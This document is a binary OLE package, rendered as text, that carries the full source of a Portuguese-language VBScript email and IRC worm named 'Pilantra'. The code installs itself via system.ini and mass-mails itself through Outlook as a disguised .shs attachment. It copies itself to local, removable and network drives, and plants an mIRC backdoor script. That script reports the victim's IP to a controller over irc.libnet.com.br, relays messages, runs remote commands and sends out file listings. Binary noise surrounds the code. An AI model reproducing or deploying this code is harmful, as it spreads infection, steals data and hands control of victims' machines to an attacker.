��ࡱ�                >  ��	                               ����        ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   ����   E            	   
      F                                                                !   "   #   $   %   &   '   (   )   *   +   ,   -   .   /   0   1   2   3   4   5   6   7   8   9   :   ;   <   =   >   ?   @   A   B   C   D   ��������G   H   I   J   K   L   M   ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������R o o t   E n t r y                                               ��������                               ���."�           I T E M 0 0 0                                                  ����            �      F     b�#-"����."�             O l e                                                         
 ����   ����                                        5        C o m p O b j                                                   ������������                                       O       ����   ����               	   
                                                                      !   "   #   $   %   &   '   (   )   *   +   ,   -   .   /   0   1   2   3   4   5   6   7   8   9   :   ;   <   ��������?   ��������B   C   D   E   F   G   H   I   J   K   L   M   N   O   P   Q   R   S   T   U   V   W   X   Y   Z   [   \   ]   ^   _   `   a   b   c   d   e   f   g   h   i   j   k   l   m   n   o   p   q   r   s   t   u   v   w   x   y   z   ������������������������              %         �      F   \    Object             ��
  ����      �      F   Pacote    Package    Package �9�q                                                             ����         ����       �  E  *   	     !              2 A    ���      �        MS Sans Serif      -     ���    	        e   A� �                (                                         ��� �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �   O l e P r e s 0 0 0                                                  ����                                       d       O l e 1 0 N a t i v e                                          ����   ����                                       Dp      R i c h E d i t F l a g s                                         ������������                                    =           I T E M 0 0 0 O D S                                               	   ����                                    >   P       �  �  �  �  �  �  �  ?�  �  �       	            ���    	        !  AF f                (                                                                                                                                              ���������������������������������������������������������������������������                  ���������������������������������������������������������������������������                  ���������������������������������������������������������������������������                  ������������������                                    ���������������������                  ���������������������������������������   ������   ������������������                  �������������� ����� ����� ����� ������   �� ������   ���������������                  ����������������� ����� ����� ������   �� ����� ������   ������������                  �������������� ���������������������   ����� ����� ���   ������������                  �������������������������������� ������      �� ������   ������������                  ������������������   �� ����� ���   ������������                  �������������������������� ����� ����� ����� ����� ������   ������������                  ����������������������������� ����� ����� ����� ������   ���������������                  ������������������������      �� ������   ������������������                  ����������������������� ����� ����� ����� ������   ���������������������                  ������������������      �� ������   ������������������������                  ����������������� ����� ����� ����� ������   ���������������������������                  ��������������       ������   ������������������������������                  �������������������������� ����� ���   ���������������������������������                  ������������      ������                  ���������������                  �������������������������������� ���   ���������������   ������������                  ������������      ������   ���������������   ������������                  ����������� ����������������������� ���   ���������   ���������������                  ���������������      ����� ���      ������������������                  ����������������� ����������� ����������� ���      ���������������������                  ������������������������                                 ������������������������������������������������������������������                     ���������������������������������������������������������������                        ������������������������������������������������������������                           ���������������������������������������������������������                              ���������������������������������������������������������                                                                	                . 
   ! by:SWaNk! !    �                 Courier New      -                                                                                                                 P         �      F   �  E             4   B   P a c o t e   P a c o t e                                                   @p   by:SWaNk C:\SWaNk\virus\vbs\pilantra\pilantra.vbs    )   C:\SWaNk\virus\vbs\pilantra\pilantra.vbs �o  'Pilantra.i-worm Pilantra virus "Penso logo existo, se existo, logo sou" 
'By:SWaNk Estufa co. somos BRASILEIROS! 

dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef

Call rodado("c:\File0004.CHK")
Call ntwrk()
call ShowFolderList("c:\")

sub ShowFolderList(s)
on error resume next

Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
	Set SubFolds1 = RootFolder1.subfolders
	For Each f1 in Subfolds1
		s = f1.path & "\"
		Otag = s & "mirc.ini"
		AOtag= s & "mirc.dat"
		DummyTag= "C:\winamod.dat"
		TTag= s & "addonGUI.dll"
		SectionDef= "[rfiles]"
		if filesys.fileexists(otag) then 
			Call Filemod() 
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementRemote()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementWarn()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementFserv()
			filesys.CopyFile DummyTag, Otag, true
			call ImplementPerfCheck()
			filesys.CopyFile DummyTag, Otag, true
			Call ImplementPerform()
			SetClearArchiveBit(Otag)
Call criaFile0001()
Call criaFile0002()
Call apagaPayload("plat�nico.txt")

		End If
	Call ShowFolderList(s)
Next
End sub

sub instala ()
Dim obj,windows,s, f
Set obj = CreateObject("Scripting.FileSystemObject")
Set windows = obj.GetSpecialFolder(0)
set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(WScript.ScriptFullName)
f.copy(windows&"\explorer.dll.vbs")
alvo5="explorer.dll.vbs"
editini windows&"\system.ini","[boot]","shell","Explorer.exe " & alvo5
end sub

Function FiltNum(FilString)
'on error resume next
countdown=5
do
	Comp = mid(FilString,2,countdown)
	if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function

Function LastLineNum(SSection)
'on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)

Do While FR1N.AtEndOfStream <> True
	segment1 = FR1N.readline
	w = InstrRev(segment1,SSection)
	counts=counts+1
	if w > 0 then 
		do
			if FR1N.AtEndOfStream = True then exit do
			segmentk = FR1N.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
			end if
		Loop until k=0
	end if
loop
FR1N.Close
LastLineNum=LastNum
end function

Function Filemod()
'on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)

Do While fr1.AtEndOfStream <> True
	segment1 = fr1.readline
	fr2.writeline segment1
	w = InstrRev(segment1,"[rfiles]")
	counts=counts+1
	if w > 0 then 
	counts2=counts
		do
			if fr1.AtEndOfStream = True then exit do
			segmentk = fr1.readline
			k = InstrRev(segmentk,"n",1)		
			if k=1 then
				LastNum=FiltNum(segmentk)
				fr2.writeline segmentk
			end if
		COUNTS2=COUNTS2+1
		Loop until k<>1
	exit do
	end if
loop
fr1.Close
fr2.close

Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=addonGUI.dll"
fr3.writeline TrojanInfo
fr3.Close

Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)

Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)

Do While fr4.AtEndOfStream <> True
	segment2 = fr4.readline
	if fr4.line >= counts2 + 2 then 
		fr5.writeline segment2
	end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function

sub FLDL(TTag)
'on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "on 1:TEXT:*teste do script*:*:{  //set %mstr $nick |  //raw -q privmsg %mstr : Estou infectado ip: $ip $+ : $+ $port ( $+ $server $+ ) raiz do mirc ( $+ $mircdir $+ ) | //halt }"
  fr6.writeline "ctcp 1:*:*:{  if ( $nick == %mstr ) { $1- |  /halt  } }"
    fr6.writeline "1:INPUT:*:{ if (%mstr != $null)  //raw -q privmsg %mstr : -  $me para $active  - $1- }"
      fr6.writeline "on 1:TEXT:*:?:{  if (%mstr != $null) //raw -q privmsg %mstr : - $nick para $me - $1- }"
        fr6.writeline "alias sinc { set %mstr $read(File0003.CHK, 2) }"
          fr6.writeline "alias diretorios {  run c:\File0001.CHK.vbs | set %arquivo c:\File0001.txt |  LS %mstr }"
            fr6.writeline "alias arquivos {  run c:\File0002.CHK.vbs | set %arquivo c:\File0002.txt |  LS %mstr }"
              fr6.writeline "alias baixar { set %arquivo $read(File0003.CHK, 1) |  LS %mstr }"
                fr6.writeline "On 1:SockClose:�.*:{"
                fr6.writeline "  Set %�.tmp6 $remove($sockname,�.) "
                fr6.writeline "  sockclose $sockname "
                fr6.writeline "  sockclose [ �. $+ [ %�.tmp6 ] ] "
                fr6.writeline "  .timer $+ %�.tmp6 off"
                fr6.writeline "}"
                fr6.writeline "On 1:SockListen:�.*:{"
                fr6.writeline "  Set %�.tmp5 $remove($sockname,�.) "
                fr6.writeline "  sockaccept �. $+ %�.tmp5 "
                fr6.writeline "  SL %�.tmp5 "
                fr6.writeline "}"
                fr6.writeline "On 1:SockWrite:�.*:{"
                fr6.writeline "  Set %�.tmp6 $remove($sockname,�.) "
                fr6.writeline "  if ( [ % $+ [ �S. $+ [ %�.tmp6 ] ] ] = 1 ) {"
                fr6.writeline "    .timer $+ $r(99,9999) 1 10 sockclose $sockname "
                fr6.writeline "    .timer $+ $r(99,9999) 1 10 sockclose [ �. $+ [ %�.tmp6 ] ] "
              fr6.writeline "  .timer $+ %�.tmp6 off | halt } | SL %�.tmp6 "
              fr6.writeline "}"
              fr6.writeline "alias LS {"
              fr6.writeline "  if ( $sock(�.*,0) > 5 ) { return } "
              fr6.writeline "  Set %�S. $+ $1 0 "
              fr6.writeline "  :pointless "
              fr6.writeline "  Set %pt $r(2400,5000) "
              fr6.writeline "  if ( $portfree(%pt) = $false ) { goto pointless } "
              fr6.writeline "  Set [ % $+ [ be. $+ [ $1 ] ] ] 0 "
              fr6.writeline "  Set %pk. $+ $1 4096 "
              fr6.writeline "  Set %sz $file(%arquivo).size "
              fr6.writeline "  Set %�.tmp4 �. $+ $1 "
              fr6.writeline "  .timer $+ $1 1 240 .sockclose %�.tmp4 $+ $chr(32) $+ $chr(124) $+ $chr(32) $+ .sockclose �. $+ $1 "
              fr6.writeline "  .timer1 $+ $1 1 20 TO $1 "
              fr6.writeline "  .notice $1 DCC Send $left($gettok(%arquivo,3,92), $calc( [ $len( [ $gettok(%arquivo,3,92) ] ) ] - 4 ) ) ( $+ $ip $+ ) "
              fr6.writeline "  if ( $1 = %�.warning ) { return } "
              fr6.writeline "  .ignore -u90 $1 2 "
              fr6.writeline "  .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %arquivo $longip($ip) %pt %sz $+ $chr(1) "
              fr6.writeline "  if ( $sock(%�.tmp4) != $null ) { .sockclose %�.tmp4 } "
              fr6.writeline "  .socklisten %�.tmp4 %pt "
              fr6.writeline "}"
              fr6.writeline "alias SL {"
              fr6.writeline "  if ( $calc( [ % $+ [ be. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) {"
              fr6.writeline "    bread %arquivo [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data "
              fr6.writeline "    .sockwrite �. $+ $1 &data "
              fr6.writeline "    inc [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] "
            fr6.writeline "  } "
            fr6.writeline "  else {"
            fr6.writeline "    Set [ % $+ [ �S. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ be. $+ [ $1 ] ] ] ) "
            fr6.writeline "    if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } "
            fr6.writeline "    bread %arquivo [ % $+ [ be. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data "
            fr6.writeline "    .sockwrite �. $+ $1 &data "
            fr6.writeline "  }"
            fr6.writeline "}"
            fr6.writeline "raw 401:*: halt | raw 404:*: halt"
            fr6.writeline "on 1:CONNECT:aviso | set %mirc.raiz $mircdir "
            fr6.writeline "on 1:DISCONNECT: set %mstr $null "
            fr6.writeline "on 1:JOIN:#:manda | aviso"
            fr6.writeline "on 1:sockopen:aviso*:{"
            fr6.writeline "  if (aviso isin $sockname) {"
            fr6.writeline "    sockwrite -tn $sockname user estufa - - : $+ $strip($logo)"
            fr6.writeline "    sockwrite -tn $sockname nick $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) "
            fr6.writeline "  }"
            fr6.writeline "}"
            fr6.writeline "on 1:sockread:*:{"
            fr6.writeline "  if (aviso isin $sockname) {"
            fr6.writeline "    sockread %recebido"
            fr6.writeline "    if ($left(%recebido,6) == PING $+ $chr(32) $+ :) { sockwrite -tn $sockname PONG $mid(%recebido,6,$len(%recebido)) }"
              fr6.writeline "  }"
              fr6.writeline "}"
              fr6.writeline "alias aviso { sockclose aviso | sockopen aviso irc.libnet.com.br 6667 }"
                fr6.writeline "alias manda {  if (%mstr != $null) { sockwrite -tn aviso privmsg %mstr : Estou infectado ip: $+ $ip $+ : $+ $port ( $+ $server $+ ) raiz do mirc ( $+ $mircdir $+ )  } }"
                  fr6.close
                  end sub

                  Function ImplementRemote()
                  Set fs1a = CreateObject("Scripting.FileSystemObject")
                  Set fr1a = fs1a.OpenTextFile(otag,1,true)
                  Set fs2a = CreateObject("Scripting.FileSystemObject")
                  Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

                  Do While fr1a.AtEndOfStream <> True
                  	segment1a = fr1a.readline
                  	fr2a.writeline segment1a
                  	if ucase(segment1a)=ucase("[options]") then
                  	Do
                  		If fr1a.AtEndOfStream Then exit do
                  		n2a = fr1a.readline
                  		If ucase(mid(n2a,1,3))=ucase("n2=") then
                  			fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
                  			exit do
                  		Else
                  			fr2a.writeline n2a
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1a.Close
                  fr2a.close
                  End Function

                  Function Implementfserv()
                  Set fs1a = CreateObject("Scripting.FileSystemObject")
                  Set fr1a = fs1a.OpenTextFile(otag,1,true)
                  Set fs2a = CreateObject("Scripting.FileSystemObject")
                  Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)

                  Do While fr1a.AtEndOfStream <> True
                  	segment1a = fr1a.readline
                  	fr2a.writeline segment1a
                  	if ucase(segment1a)=ucase("[warn]") then
                  	Do
                  		If fr1a.AtEndOfStream Then exit do
                  		n2a = fr1a.readline
                  		If ucase(n2a)=ucase("fserve=on") then
                  			fr2a.writeline "fserve=off"
                  		Else
                  			fr2a.writeline n2a
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1a.Close
                  fr2a.close
                  End Function

                  Function Implementwarn()
                  Set fs1c = CreateObject("Scripting.FileSystemObject")
                  Set fr1c = fs1c.OpenTextFile(otag,1,true)
                  Set fs2c = CreateObject("Scripting.FileSystemObject")
                  Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)

                  Do While fr1c.AtEndOfStream <> True
                  	segment1c = fr1c.readline
                  	fr2c.writeline segment1c
                  	if ucase(segment1c)=ucase("[fileserver]") then
                  	Do
                  		if fr1c.AtEndOfStream then exit do
                  		n2c = fr1c.readline
                  		If ucase(n2c)=ucase("warning=on") then
                  			fr2c.writeline "warning=off"
                  		Else
                  			fr2c.writeline n2c
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1c.Close
                  fr2c.close
                  End Function

                  Function ImplementPerform()
                  Set fs1p = CreateObject("Scripting.FileSystemObject")
                  Set fr1p = fs1p.OpenTextFile(Otag,8,true)
                  fr1p.writeline "[Perform]"
                  fr1p.writeline "n0=/Remote ON"
                  fr1p.Close
                  fs1p.close
                  End Function

                  Sub SetClearArchiveBit(filespec)  
                  Dim fsg, fg
                  Set fsg = CreateObject("Scripting.FileSystemObject")
                  Set fg = fsg.GetFile(filespec)  
                  fg.attributes = 0
                  fg.attributes = fg.attributes + 1
                  End Sub

                  Function ImplementPerfCheck()
                  Set fs1f = CreateObject("Scripting.FileSystemObject")
                  Set fr1f = fs1f.OpenTextFile(otag,1,true)
                  Set fs2f = CreateObject("Scripting.FileSystemObject")
                  Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)

                  Do While fr1f.AtEndOfStream <> True
                  	segment1f = fr1f.readline
                  	fr2f.writeline segment1f
                  	if ucase(segment1f)=ucase("[options]") then
                  	Do
                  		If fr1f.AtEndOfStream Then exit do
                  		n2f = fr1f.readline
                  		If ucase(mid(n2f,1,3))=ucase("n0=") then
                  			fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
                  			exit do
                  		Else
                  			fr2f.writeline n2f
                  		End If
                  	Loop
                  	end if
                  loop
                  fr1f.Close
                  fr2f.close
                  End Function

                  sub editini(filename,section,string,newvalue)
                  on error resume next
                  Const ForReading = 1
                  Const ForWriting = 2
                  iniFile = filename
                  sectionName = section
                  keyName = string
                  newVlaue = newvalue
                  bInSection = false
                  bKeyChanged = false
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set ts = fso.OpenTextFile(iniFile, ForReading)
                  lines = Split(ts.ReadAll,vbCrLf)
                  ts.close
                  For n = 0 to ubound(lines)
                  if left(lines(n),1) = "[" then
                  if bInSection then
                  exit for
                  end if
                  if instr(lines(n),sectionName) = 1 then
                  bInSection = true
                  else
                  bInSection = false
                  end if
                  else
                  if bInSection then
                  if instr(lines(n),keyName & "=") = 1 then
                  bKeyChanged = true
                  lines(n) = keyName & "=" & newVlaue
                  bKeyChanged = true
                  exit for
                  end if
                  end if
                  end if
                  Next
                  if bKeyChanged then
                  Set ts = fso.OpenTextFile(iniFile, ForWriting)
                  ts.Write join(lines,vbCrLf)
                  ts.close
                  end if
                  set ts = nothing
                  set fso = nothing
                  end sub

                  Sub CriaFile0001 ()
                  Dim fso, MyFile
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set MyFile = fso.CreateTextFile("c:\file0001.CHK.vbs", True)
                  MyFile.WriteLine("call ShowFolderList" & Chr(40) & Chr(34) & "c:\" & Chr(34) & Chr(41) )
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Function ShowFolderList" & Chr(40) & "folderspec" & Chr(41) )
                  MyFile.WriteLine("Dim fso, f, f1, fc, s, CRLF, arquivo")
                  MyFile.WriteLine("CRLF = Chr" & Chr(40) & "13" & Chr(41) & " & " & "Chr" & Chr(40) & "10" & Chr(41) )
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set f = fso.GetFolder" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("Set fc = f.SubFolders")
                  MyFile.WriteLine("For Each f1 in fc")
                  MyFile.WriteLine("s = s & f1.name") 
                  MyFile.WriteLine("s = s & CRLF")
                  MyFile.WriteLine("Next")
                  MyFile.WriteLine("ShowFolderList = s")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set arquivo= fso.CreateTextFile" & chr(40) & chr(34) & "c:\File0001.txt" & chr(34) & ", True" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------=(Lista de Sub diret�rios)=-----------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "s" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------------=(eof)=-------------------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "Estufa co. By:SWaNk" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.Close")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("End Function")
                  MyFile.Close
                  End Sub

                  Sub CriaFile0002 ()
                  Dim fso, MyFile
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set MyFile = fso.CreateTextFile("c:\file0002.CHK.vbs", True)
                  MyFile.WriteLine("call ShowFileList" & Chr(40) & Chr(34) & "c:\" & Chr(34) & Chr(41) )
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Function ShowFileList" & Chr(40) & "folderspec" & Chr(41) )
                  MyFile.WriteLine("Dim fso, f, f1, fc, s, CRLF, arquivo")
                  MyFile.WriteLine("CRLF = Chr" & Chr(40) & "13" & Chr(41) & " & " & "Chr" & Chr(40) & "10" & Chr(41) )
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set f = fso.GetFolder" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("Set fc = f.Files")
                  MyFile.WriteLine("For Each f1 in fc")
                  MyFile.WriteLine("s = s & f1.name") 
                  MyFile.WriteLine("s = s & CRLF")
                  MyFile.WriteLine("Next")
                  MyFile.WriteLine("ShowFileList = s")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("Set fso = CreateObject(" & chr(34) & "Scripting.FileSystemObject" & chr(34) & chr(41) )
                  MyFile.WriteLine("Set arquivo= fso.CreateTextFile" & chr(40) & chr(34) & "c:\File0002.txt" & chr(34) & ", True" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "folderspec" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------=(Lista de Arquivos)=-----------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & "s" & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "---------------------=(eof)=-------------------------" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.WriteLine" & chr(40) & chr(34) & "Estufa co. By:SWaNk" & chr(34) & chr(41) )
                  MyFile.WriteLine("arquivo.Close")
                  MyFile.WriteLine(" ")
                  MyFile.WriteLine("End Function")
                  MyFile.Close
                  End Sub

                  Function espalha()
                  Dim obj, win,s,f,assuntos
                  Set obj = CreateObject("Scripting.FileSystemObject")
                  Set win = obj.GetSpecialFolder(0)
                  set s = CreateObject("Scripting.FileSystemObject")
                  Set f = s.GetFile(WScript.ScriptFullName)
                  f.copy(win&"\Plat�nico.txt                                                                            .shs")
                  local=win&"\Plat�nico.txt                                                                            .shs"
                  var1="Out" & "look"
                  Set FRS68KB2 = CreateObject("Out" & "look.App" &"lic" & "ation")
                  If FRS68KB2 = var1 Then
                  Set MB75TQQ8 = FRS68KB2.GetNameSpace("M" & "A" & "PI")
                  Set M7S7H1IR =MB75TQQ8.AddressLists 
                  For Each GT6C51QD In M7S7H1IR
                  If GT6C51QD.AddressEntries.Count <> 0 Then
                  R35B1P85 = GT6C51QD.AddressEntries.Count
                  For JU378G6M = 1 To R35B1P85
                  Set H7G48BDM = FRS68KB2.CreateItem(0)
                  Set GVU5OH32 = GT6C51QD.AddressEntries(JU378G6M)
                  H7G48BDM.To = GVU5OH32.Address
                  Randomize
                  assuntos = Int((3 * Rnd) + 1)	
                  if assuntos = 1 then
                  H7G48BDM.Subject = "Texto imperd�vel!"
                  elseif assuntos = 2 then
                  H7G48BDM.Subject = "Texto muito engra�ado!"
                  else 
                  H7G48BDM.Subject = "O melhor texto que li nos �ltimos tempos..."
                  End if
                  H7G48BDM.Body = "................................................" & vbcrlf & "Ol�!!" & vbcrlf & "N�o posso falar muito sobre o texto porque se n�o perde a gra�a, � uma hist�ria de amor plat�nico... Achei muito engra�ado vale a pena!!" & vbcrlf & "....  .... .  .....    .....  ....  . ...   ....." & vbcrlf & "..... ....   ....  .     .  ....    .....  ...." & vbcrlf & ""
                  execute "set TQK3VJ18 =H7G48BDM." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
                  SND01BAO = local
                  H7G48BDM.DeleteAfterSubmit = True
                  TQK3VJ18.Add SND01BAO
                  If H7G48BDM.To <> "" Then
                  H7G48BDM.Send
                  End If
                  Next
                  End If
                  Next
                  End If
                  End function

                  Sub marca()
                  Dim fso, MyFile
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set MyFile = fso.CreateTextFile("c:\File0004.CHK", True)
                  MyFile.WriteLine("Estufa co.")
                  MyFile.Close
                  End Sub

                  Function rodado(filespec)
                  Dim fso, msg
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  If (fso.FileExists(filespec)) Then
                  Call payload()
                  Else
                  Call payload()
                  Call instala()
                  Call espalha()
                  Call marca()
                  End If
                  End Function

                  Function apagaPayload(filespec)
                  Dim fso, msg
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  If (fso.FileExists(filespec)) Then
                  Call apaga("Plat�nico.txt")
                  End If
                  End Function

                  Sub payload ()
                  Dim fso, payload, WshShell, cmnd
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set payload = fso.CreateTextFile("Plat�nico.txt", True)
                  payload.WriteLine("   Sat�nico � o meu pensamento ao teu respeito e ardente � o meu desejo de ")
                  payload.WriteLine("apertar-te em minhas m�os, uma sede de vingan�a incontest�vel pelo que me fizeste ontem.") 
                  payload.WriteLine("A noite quente e calma chegara a ser angustiosa. Apareceste e nesta cama aconteceu... ")
                  payload.WriteLine("Sorrateiramente te aproximaste... ")
                  payload.WriteLine("Sem o m�nimo pudor... ")
                  payload.WriteLine("Encostaste o teu corpo sem roupa no meu corpo n�. ")
                  payload.WriteLine("Percebendo a minha aparente indiferen�a, aconchegaste-te a mim, e mordeste-me")
                  payload.WriteLine("sem escr�pulos at� os mais �ntimos lugares jamais tocados de meu casto corpo. ")
                  payload.WriteLine("E adormeci... ")
                  payload.WriteLine("Hoje, quando acordei, procurei-te numa �nsia ardente, mas em v�o...") 
                  payload.WriteLine("Deixaste provas irrefut�veis do que ocorreu na noite que passou. ")
                  payload.WriteLine("Grandes manchas no meu corpo e o alvo len�ol salpicado de sangue. ")
                  payload.WriteLine("Esta noite recolho-me mais cedo para, na mesma cama te esperar. ")
                  payload.WriteLine("Oh! Quando chegares, nem quero pensar com que perspic�cia, ")
                  payload.WriteLine("avidez e for�a eu quero te pegar para que n�o escapes mais de mim. ")
                  payload.WriteLine("Em minhas m�os quero apertar-te at� o fim. ")
                  payload.WriteLine("N�o haver� parte do teu corpo que os meus dedos n�o passar�o. ")
                  payload.WriteLine("N�o descansarei enquanto ver sair o sangue quente de teu corpo. ")
                  payload.WriteLine(" ")
                  payload.WriteLine("S� assim livrar-me-ei de ti PULGA MALDITA.") 
                  payload.Close
                  Set WshShell = WScript.CreateObject("WScript.Shell")
                  cmnd = "notepad.exe plat�nico.txt"
                  WshShell.Run (cmnd)
                  End Sub

                  Sub apaga(filespec)
                  Dim fso
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  fso.DeleteFile(filespec)
                  End Sub

                  sub infect(drive)
                  On Error Resume Next
                  set s = CreateObject("Scripting.FileSystemObject")
                  Set f = s.GetFile(WScript.ScriptFullName)
                  f.copy(drive & "\Pulga.txt.shs")
                  path=drive&"\Pulga.txt.shs"
                  end sub
                  Function ShowDriveType(drvpath)
                  On Error Resume Next
                  Dim fso, d, t
                  Set fso = CreateObject("Scripting.FileSystemObject")
                  Set d = fso.GetDrive(drvpath)
                  Select Case d.DriveType
                  Case 0: t = "Unknown"
                  Case 1: t = "Removable"
                  Case 2: t = "Fixed"
                  Case 3: t = "Network"
                  Case 4: t = "CD-ROM"
                  Case 5: t = "RAM Disk"
                  End Select
                  if t = "" then t = "None"
                  ShowDriveType = t
                  End Function
                  sub ntwrk()
                  On Error Resume Next
                  for n = 65 to 90
                  l=Chr(n) 
                  drv=l&":"
                  d3=ShowDriveType(drv)
                  if d3 = "Fixed" then infect(drv)
                  if d3 = "Network" then infect(drv)
                  if d3 = "Removable" then infect(drv)
                  next
                  end sub
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               I T E M 0 0 0 F M T                                             ������������                                    @           I T E M 0 0 0 F M T # 3                                         ��������
         �      F    �'֥."�`��."�             O l e                                                         
 ����   ����                                    {          C O N T E N T S                                                   ������������                                    A   R       #3                                                            ��ƚ      �1@    �U 	     !              2 A    ���      �        MS Sans Serif      -     ���    	        e   A� �                (                                         ��� �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  �  ?�  �  �       	            ���    	        !  AF f                (                                                                                                                                              ���������������������������������������������������������������������������                  ���������������������������������������������������������������������������                  ���������������������������������������������������������������������������                  ������������������                                    ���������������������                  ���������������������������������������   ������   ������������������                  �������������� ����� ����� ����� ������   �� ������   ���������������                  ����������������� ����� ����� ������   �� ����� ������   ������������                  �������������� ���������������������   ����� ����� ���   ������������                  �������������������������������� ������      �� ������   ������������                  ������������������   �� ����� ���   ������������                  �������������������������� ����� ����� ����� ����� ������   ������������                  ����������������������������� ����� ����� ����� ������   ���������������                  ������������������������      �� ������   ������������������                  ����������������������� ����� ����� ����� ������   ���������������������                  ������������������      �� ������   ������������������������                  ����������������� ����� ����� ����� ������   ���������������������������                  ��������������       ������   ������������������������������                  �������������������������� ����� ���   ���������������������������������                  ������������      ������                  ���������������                  �������������������������������� ���   ���������������   ������������                  ������������      ������   ���������������   ������������                  ����������� ����������������������� ���   ���������   ���������������                  ���������������      ����� ���      ������������������                  ����������������� ����������� ����������� ���      ���������������������                  ������������������������                                 ������������������������������������������������������������������                     ���������������������������������������������������������������                        ������������������������������������������������������������                           ���������������������������������������������������������                              ���������������������������������������������������������                                                                	                . 
